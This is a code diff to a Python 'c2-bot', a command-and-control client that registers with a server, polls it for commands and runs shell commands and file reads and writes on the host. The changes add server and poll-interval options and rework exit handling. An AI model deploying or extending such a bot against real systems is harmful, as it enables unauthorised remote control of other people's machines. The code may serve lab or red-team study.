@@ -9,12 +9,13 @@ from aiohttp import ClientSession
 from time import sleep
 from collections import deque
 from typing import Any
+import argparse
 import asyncio
 import base64
 
-ID = None
-SERVER_URL = "http://localhost:8080"
-POLL_SEC = 5
+ID = str()
+SERVER_URL = str()
+POLL_SEC = int()
 
 async def run_and_return_output(command: dict[str, Any]) -> bytes:
     # run the subprocess without blocking the executor, we may be in either a reverse shell context
@@ -65,11 +66,11 @@ async def execute_command(session: ClientSession, command: dict[str, Any]) -> No
             result = await read_file(command)
         elif command["action"] == "write":
             result = await write_file(command)
-        # exiting requires special handling
+        # exiting requires special handling, return early
         elif command["action"] == "exit":
             await exit_bot()
-            await return_result(session, f"{ID} Exited".encode())
-            exit(0)
+            await return_result(session, f"Bot Exited".encode())
+            return
         else:
             result = f"unknown action: {command['action']}".encode()
 
@@ -91,7 +92,25 @@ async def obtain_id() -> str:
             return (await response.json())["id"]
 
 async def main():
-    global ID
+    global ID, SERVER_URL, POLL_SEC
+    
+    parser = argparse.ArgumentParser(
+        prog="c2-bot",
+        description="Bot for C2 system")
+
+    parser.add_argument(
+        "--server", help="The address or hostname to register with for commands (ex: http://localhost:8080)", type=str, default="http://localhost:8080"
+    )
+    
+    parser.add_argument(
+        "--poll", help="The rate in seconds at which to poll the server for new commands (ex: 5)", type=int, default="5"
+    )
+
+    args = parser.parse_args()
+
+    SERVER_URL = args.server
+    POLL_SEC = args.poll
+
     ID = await obtain_id()
     commands = deque()
 
@@ -109,6 +128,9 @@ async def main():
                 next = commands.popleft()
 
                 await execute_command(session, next)
+
+                if next["action"] == "exit":
+                    return
 
         await asyncio.sleep(POLL_SEC)
 
